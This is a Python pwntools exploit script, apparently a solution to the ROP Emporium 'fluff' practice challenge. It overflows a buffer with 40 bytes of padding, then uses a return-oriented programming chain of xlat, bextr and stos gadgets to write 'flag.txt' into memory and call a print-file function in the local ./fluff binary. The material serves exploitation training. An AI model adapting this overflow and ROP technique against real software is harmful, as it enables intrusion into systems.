from pwn import *
from struct import pack, unpack
ENDING = 5*b"\x00"
BYTEPADDING = 7*b"\x00"

xlatGadget = b"\x28\x06\x40" + ENDING #xlat [rbx]
bextrGadget = b"\x2a\x06\x40" + ENDING #pop rdx, pop rcx, add rcx, 0x3ef2, bextr rbx, rcx, rdx
stosGadget = b"\x39\x06\x40" + ENDING #stos [rdi], al
popRdiGadget = b"\xa3\x06\x40" + ENDING #pop rdi
printfile = b"\x10\x05\x40" + ENDING

def WriteByte(byteAddress, previousAl):
	rbxValue = unpack("<Q", byteAddress)[0] - previousAl
	rcxValue = rbxValue - 0x3ef2
	rdxValue = b"\x00\xFF" + 6*b"\x00"
	returnString = bextrGadget + rdxValue + pack("<q", rcxValue)
	returnString += xlatGadget
	returnString += stosGadget 
	return returnString

stringHole = b"\x28\x10\x60" + ENDING
initialAlValue = ord('\x0b')

fAddress = b"\xc4\x03\x40" + ENDING
lAddress = b"\x3f\x02\x40" + ENDING
aAddress = b"\x11\x04\x40" + ENDING
gAddress = b"\xcf\x03\x40" + ENDING
dotAddress = b"\x51\x02\x40" + ENDING
tAddress = b"\x92\x01\x40" + ENDING
xAddress = b"\x46\x02\x40" + ENDING

payload = b"A"*40 + popRdiGadget + stringHole + WriteByte(fAddress, initialAlValue) + WriteByte(lAddress, ord('f')) + WriteByte(aAddress, ord('l')) + WriteByte(gAddress, ord('a')) + WriteByte(dotAddress, ord('g')) + WriteByte(tAddress, ord('.')) + WriteByte(xAddress, ord('t')) + WriteByte(tAddress, ord('x')) + popRdiGadget + stringHole + printfile 

challenge = process("./fluff")
#pause()

challenge.sendafter(">", payload)
print(challenge.recvall())
